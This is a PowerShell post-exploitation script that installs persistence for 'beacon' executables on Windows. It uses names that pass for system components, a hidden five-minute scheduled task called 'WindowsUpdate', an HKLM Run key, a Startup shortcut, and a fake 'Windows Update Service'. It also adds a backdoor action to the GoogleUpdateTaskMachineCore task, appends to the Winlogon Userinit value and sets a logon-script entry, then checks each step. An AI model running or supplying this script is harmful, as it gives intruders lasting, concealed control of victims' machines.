# PowerShell persistence script

# Define beacon paths
$beaconPaths = @(
    "C:\ProgramData\wininfo\info.exe",
    "C:\Windows\Temp\windata\windata.exe",
    "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Windows\winupdate\wupdate.exe",
    "C:\ProgramData\Microsoft\Windows\winsvc\wsvc.exe",
    "C:\Windows\System32\Tasks\taskhost.exe"
)

# 1. Create scheduled task (5-minute interval)
Write-Host "[+] Creating scheduled task persistence..."
$action = New-ScheduledTaskAction -Execute $beaconPaths[0]
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -Settings $settings -Force

# 2. Registry Run Key (runs on login)
Write-Host "[+] Creating registry run key persistence..."
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateSvc" -Value $beaconPaths[1] -PropertyType String -Force

# 3. Startup Folder
Write-Host "[+] Creating startup folder persistence..."
$startupPath = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.lnk"
$WshShell = New-Object -ComObject WScript.Shell
$shortcut = $WshShell.CreateShortcut($startupPath)
$shortcut.TargetPath = $beaconPaths[2]
$shortcut.Save()

# 4. Service Persistence
Write-Host "[+] Creating service persistence..."
New-Service -Name "WinUpdateSvc" -BinaryPathName $beaconPaths[3] -DisplayName "Windows Update Service" -StartupType Automatic -Description "Provides support for Windows Update services" -ErrorAction SilentlyContinue

# 5. Scheduled Task Backdoor (modify existing task)
Write-Host "[+] Creating scheduled task backdoor..."
try {
    $existingTask = Get-ScheduledTask -TaskName "GoogleUpdateTaskMachineCore" -ErrorAction SilentlyContinue
    if ($existingTask) {
        $actions = $existingTask | Get-ScheduledTaskAction
        $actions += New-ScheduledTaskAction -Execute $beaconPaths[4]
        Set-ScheduledTask -TaskName "GoogleUpdateTaskMachineCore" -Action $actions
    }
} catch {
    Write-Host "[-] Could not modify existing task. Creating new task instead."
    $action = New-ScheduledTaskAction -Execute $beaconPaths[4]
    $trigger = New-ScheduledTaskTrigger -AtStartup
    Register-ScheduledTask -TaskName "GoogleUpdateTaskMachineCore" -Action $action -Trigger $trigger -Force
}

# 6. Registry UserInit (runs on user login)
Write-Host "[+] Creating UserInit registry persistence..."
$userInitKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
$userInitValue = (Get-ItemProperty -Path $userInitKey -Name "Userinit").Userinit
if (-not $userInitValue.EndsWith(",")) {
    $userInitValue += ","
}
$userInitValue += $beaconPaths[0]
Set-ItemProperty -Path $userInitKey -Name "Userinit" -Value $userInitValue

# 7. Registry Logon Script (domain persistence)
Write-Host "[+] Creating logon script registry persistence..."
try {
    $logonScriptKey = "HKCU:\Environment"
    Set-ItemProperty -Path $logonScriptKey -Name "UserInitMprLogonScript" -Value $beaconPaths[1] -Type String -Force
} catch {
    Write-Host "[-] Could not create logon script persistence."
}

Write-Host "`n[+] Persistence Installation Complete. Performing status checks..."
Write-Host "----------------------------------------"

# Status Checks
Write-Host "`n[*] Checking Scheduled Task persistence..."
$task = Get-ScheduledTask -TaskName "WindowsUpdate" -ErrorAction SilentlyContinue
if ($task) {
    Write-Host "[√] Scheduled Task 'WindowsUpdate' installed successfully."
} else {
    Write-Host "[✗] Scheduled Task installation failed."
}

Write-Host "`n[*] Checking Registry Run Key persistence..."
$runKey = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateSvc" -ErrorAction SilentlyContinue
if ($runKey) {
    Write-Host "[√] Registry Run Key 'WindowsUpdateSvc' set successfully."
} else {
    Write-Host "[✗] Registry Run Key installation failed."
}

Write-Host "`n[*] Checking Startup Folder persistence..."
if (Test-Path $startupPath) {
    Write-Host "[√] Startup shortcut created successfully."
} else {
    Write-Host "[✗] Startup shortcut creation failed."
}

Write-Host "`n[*] Checking Service persistence..."
$service = Get-Service -Name "WinUpdateSvc" -ErrorAction SilentlyContinue
if ($service) {
    Write-Host "[√] Service 'WinUpdateSvc' created successfully."
    Write-Host "    Status: $($service.Status)"
    Write-Host "    Startup Type: $($service.StartType)"
} else {
    Write-Host "[✗] Service creation failed."
}

Write-Host "`n[*] Checking Scheduled Task Backdoor..."
$backdoorTask = Get-ScheduledTask -TaskName "GoogleUpdateTaskMachineCore" -ErrorAction SilentlyContinue
if ($backdoorTask) {
    $taskActions = $backdoorTask | Get-ScheduledTaskAction
    $backdoorFound = $false
    foreach ($taskAction in $taskActions) {
        if ($taskAction.Execute -eq $beaconPaths[4]) {
            $backdoorFound = $true
            break
        }
    }
    if ($backdoorFound) {
        Write-Host "[√] Task backdoor installed successfully."
    } else {
        Write-Host "[✗] Task exists but backdoor action not found."
    }
} else {
    Write-Host "[✗] Task backdoor installation failed."
}

Write-Host "`n[*] Checking UserInit Registry persistence..."
$userInitCurrent = (Get-ItemProperty -Path $userInitKey -Name "Userinit").Userinit
if ($userInitCurrent.Contains($beaconPaths[0])) {
    Write-Host "[√] UserInit registry modified successfully."
} else {
    Write-Host "[✗] UserInit registry modification failed."
}

Write-Host "`n[*] Checking Logon Script Registry persistence..."
$logonScript = Get-ItemProperty -Path $logonScriptKey -Name "UserInitMprLogonScript" -ErrorAction SilentlyContinue
if ($logonScript) {
    Write-Host "[√] Logon Script registry set successfully."
} else {
    Write-Host "[✗] Logon Script registry setting failed."
}

Write-Host "`n[*] Summary of Persistence Mechanisms:"
Write-Host "----------------------------------------"
Write-Host "1. Scheduled Task (5min): " -NoNewline
if ($task) { Write-Host "INSTALLED" -ForegroundColor Green } else { Write-Host "FAILED" -ForegroundColor Red }
Write-Host "2. Registry Run Key: " -NoNewline
if ($runKey) { Write-Host "INSTALLED" -ForegroundColor Green } else { Write-Host "FAILED" -ForegroundColor Red }
Write-Host "3. Startup Folder: " -NoNewline
if (Test-Path $startupPath) { Write-Host "INSTALLED" -ForegroundColor Green } else { Write-Host "FAILED" -ForegroundColor Red }
Write-Host "4. Service: " -NoNewline
if ($service) { Write-Host "INSTALLED" -ForegroundColor Green } else { Write-Host "FAILED" -ForegroundColor Red }
Write-Host "5. Task Backdoor: " -NoNewline
if ($backdoorFound) { Write-Host "INSTALLED" -ForegroundColor Green } else { Write-Host "FAILED" -ForegroundColor Red }
Write-Host "6. UserInit Registry: " -NoNewline
if ($userInitCurrent.Contains($beaconPaths[0])) { Write-Host "INSTALLED" -ForegroundColor Green } else { Write-Host "FAILED" -ForegroundColor Red }
Write-Host "7. Logon Script Registry: " -NoNewline
if ($logonScript) { Write-Host "INSTALLED" -ForegroundColor Green } else { Write-Host "FAILED" -ForegroundColor Red }